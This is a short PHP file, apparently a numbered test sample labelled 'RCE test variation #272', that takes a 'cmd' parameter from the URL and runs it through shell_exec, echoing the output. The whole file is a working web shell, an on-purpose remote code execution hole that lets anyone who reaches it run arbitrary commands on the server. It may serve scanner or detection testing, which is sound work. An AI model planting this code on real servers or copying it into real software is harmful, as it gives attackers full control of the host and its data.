<?php
// RCE test variation #272
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>